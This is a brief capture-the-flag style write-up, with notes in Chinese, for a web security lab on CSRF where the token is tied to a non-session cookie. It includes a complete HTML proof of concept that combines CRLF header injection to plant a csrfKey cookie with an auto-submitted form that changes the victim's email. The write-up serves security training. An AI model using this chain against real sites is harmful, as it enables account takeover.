# Lab: CSRF where token is tied to non-session cookie

 This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

* wiener:peter
* carlos:montoya

## CSRF
* 這一題因為 cookie 中的 csrfKey 跟 token 是綁定的，所以只要 victim 的 cookie 是我們指定的 key，這樣就可以改 email 了，觀察一下可以發現在 search 頁面可以用 `%0a%0d` 這樣就可以 set 指定的 cookie 了
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://aca81fcc1e0ca02ec0682276002600f4.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="exploit&#64;entroy&#46;tk" />
      <input type="hidden" name="csrf" value="9uEdA3PXKyhToHiNuPxmEl9WyLzAhdiN" />
    </form>
  </body>
<script>
var image = new Image();
image.src = "https://aca81fcc1e0ca02ec0682276002600f4.web-security-academy.net/?search=a%0a%0dSet-Cookie:+csrfKey=emZQ78eji8iGETEAN1Kjf3rfdRPODyu0";
image.onerror = document.forms[0].submit();
</script>
</html>
```